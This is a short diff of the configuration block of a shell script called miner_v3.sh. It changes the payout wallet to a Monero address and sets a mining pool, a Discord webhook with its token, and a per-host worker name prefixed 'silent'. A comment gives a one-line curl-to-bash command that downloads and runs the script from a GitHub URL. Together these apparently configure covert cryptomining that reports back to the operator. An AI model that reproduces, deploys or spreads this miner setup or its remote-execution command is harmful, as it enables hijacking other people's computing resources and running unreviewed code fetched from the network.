@@ -2,7 +2,7 @@
 # bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/miner_v3.sh)
 
 # ========== CONFIG ==========
-WALLET="0xd87D21a9459F12c952D0F356C2e80bC0330D5914"
+WALLET="49psjXJpEJgSiodJXSxhFYN87boJRaERuKWo89RJCSFG5RfhqBkZ1kjUy3wDVUEuCRGH6Uyo4sw9xi8fAQhEJBdAJapyhkP"
 POOL="pool.supportxmr.com:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1361974628339155007/mfoD2oC4vtSNXOhRKQcinbADhtbsM720wiN3WEkYm1wZbL30D0GD9P84d1VF9xaCoVdK"
 WORKER="silent_$(hostname)"
